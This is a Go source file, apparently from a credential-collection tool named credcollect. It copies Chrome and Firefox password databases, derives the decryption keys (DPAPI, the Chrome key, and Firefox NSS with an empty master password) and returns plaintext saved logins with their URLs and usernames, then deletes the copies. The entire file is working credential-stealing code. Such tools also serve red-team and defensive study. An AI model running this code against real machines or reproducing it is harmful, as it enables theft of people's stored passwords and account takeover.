package browser

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"sort"
	"time"

	"github.com/404tk/credcollect/common/utils"
	"github.com/404tk/credcollect/pkg/browser/decrypt"
	"github.com/tidwall/gjson"
	_ "modernc.org/sqlite"
)

type Item interface {
	// ChromeParse parse chrome items, Password need secret key
	ChromeParse(key []byte) error

	// FirefoxParse parse firefox items
	FirefoxParse() error

	// OutPut file name and format type
	OutPut(browser string, res map[string][]interface{}) error

	// CopyDB is copy item db file to current dir
	CopyDB() error

	// Release is delete item db file
	Release() error
}

const (
	ChromePasswordFile = "Login Data"
	FirefoxKey4File    = "key4.db"
	FirefoxLoginFile   = "logins.json"
)

var (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryMetaData      = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate    = `SELECT a11, a102 from nssPrivate`
)

type passwords struct {
	mainPath string
	subPath  string
	logins   []LoginData
}

func NewFPasswords(main, sub string) Item {
	return &passwords{mainPath: main, subPath: sub}
}

func NewCPasswords(main, sub string) Item {
	return &passwords{mainPath: main}
}

func (p *passwords) ChromeParse(key []byte) error {
	loginDB, err := sql.Open("sqlite", ChromePasswordFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	rows, err := loginDB.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		if err != nil {
			log.Println(err)
		}
		login := LoginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if key == nil {
			password, err = decrypt.DPApi(pwd)
		} else {
			password, err = decrypt.ChromePass(key, pwd)
		}
		if err != nil {
			log.Printf("%s have empty password %s\n", login.LoginUrl, err.Error())
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}
		login.Password = string(password)
		p.logins = append(p.logins, login)
	}
	return nil
}

func (p *passwords) FirefoxParse() error {
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey()
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	metaPBE, err := decrypt.NewASN1PBE(metaBytes)
	if err != nil {
		log.Println("decrypt meta data failed", err)
		return err
	}
	// default master password is empty
	var masterPwd []byte
	k, err := metaPBE.Decrypt(globalSalt, masterPwd)
	if err != nil {
		log.Println("decrypt firefox meta bytes failed", err)
		return err
	}
	if bytes.Contains(k, []byte("password-check")) {
		// log.Println("password-check success")
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nssPBE, err := decrypt.NewASN1PBE(nssA11)
			if err != nil {
				log.Println("decode firefox nssA11 bytes failed", err)
				return err
			}
			finallyKey, err := nssPBE.Decrypt(globalSalt, masterPwd)
			finallyKey = finallyKey[:24]
			if err != nil {
				log.Println("get firefox finally key failed")
				return err
			}
			allLogins, err := getFirefoxLoginData()
			if err != nil {
				return err
			}
			for _, v := range allLogins {
				userPBE, err := decrypt.NewASN1PBE(v.encryptUser)
				if err != nil {
					log.Println("decode firefox user bytes failed", err)
				}
				pwdPBE, err := decrypt.NewASN1PBE(v.encryptPass)
				if err != nil {
					log.Println("decode firefox password bytes failed", err)
				}
				user, err := userPBE.Decrypt(finallyKey, masterPwd)
				if err != nil {
					log.Println(err)
				}
				pwd, err := pwdPBE.Decrypt(finallyKey, masterPwd)
				if err != nil {
					log.Println(err)
				}
				// log.Println("decrypt firefox success")
				p.logins = append(p.logins, LoginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(decrypt.PKCS5UnPadding(user)),
					Password:   string(decrypt.PKCS5UnPadding(pwd)),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
	return nil
}

func (p *passwords) CopyDB() error {
	err := copyToLocalPath(p.mainPath, filepath.Base(p.mainPath))
	if err != nil {
		return err
	}
	if p.subPath != "" {
		err = copyToLocalPath(p.subPath, filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) Release() error {
	err := os.Remove(filepath.Base(p.mainPath))
	if p.subPath != "" {
		err = os.Remove(filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) OutPut(browser string, res map[string][]interface{}) error {
	sort.Sort(p)
	for _, data := range p.logins {
		res["password"] = append(res["password"], data)
	}
	return nil
}

// getFirefoxDecryptKey get value from key4.db
func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB   *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite", FirefoxKey4File)
	if err != nil {
		log.Println(err)
		return nil, nil, nil, nil, err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Println(err)
		}
	}()

	pwdRows, err = keyDB.Query(queryMetaData)
	defer func() {
		if err := pwdRows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for pwdRows.Next() {
		if err := pwdRows.Scan(&item1, &item2); err != nil {
			log.Println(err)
			continue
		}
	}
	if err != nil {
		log.Println(err)
	}
	nssRows, err = keyDB.Query(queryNssPrivate)
	defer func() {
		if err := nssRows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for nssRows.Next() {
		if err := nssRows.Scan(&a11, &a102); err != nil {
			log.Println(err)
		}
	}
	return item1, item2, a11, a102, nil
}

// getFirefoxLoginData use to get firefox
func getFirefoxLoginData() (l []LoginData, err error) {
	s, err := ioutil.ReadFile(FirefoxLoginFile)
	if err != nil {
		return nil, err
	}
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m LoginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			if m.LoginUrl == "" {
				u, _ := url.Parse(v.Get("hostname").String())
				u.Path = path.Join(u.Path, v.Get("httpRealm").String())
				m.LoginUrl = u.String()
			}
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
				log.Println(err)
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}

type LoginData struct {
	UserName    string
	encryptPass []byte
	encryptUser []byte
	Password    string
	LoginUrl    string
	CreateDate  time.Time
}

func (p passwords) Len() int {
	return len(p.logins)
}

func (p passwords) Less(i, j int) bool {
	return p.logins[i].CreateDate.After(p.logins[j].CreateDate)
}

func (p passwords) Swap(i, j int) {
	p.logins[i], p.logins[j] = p.logins[j], p.logins[i]
}

func copyToLocalPath(src, dst string) error {
	locals, _ := filepath.Glob("*")
	for _, v := range locals {
		if v == dst {
			err := os.Remove(dst)
			if err != nil {
				return err
			}
		}
	}
	sourceFile, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, sourceFile, 0755)
	if err != nil {
		return err
	}
	return err
}
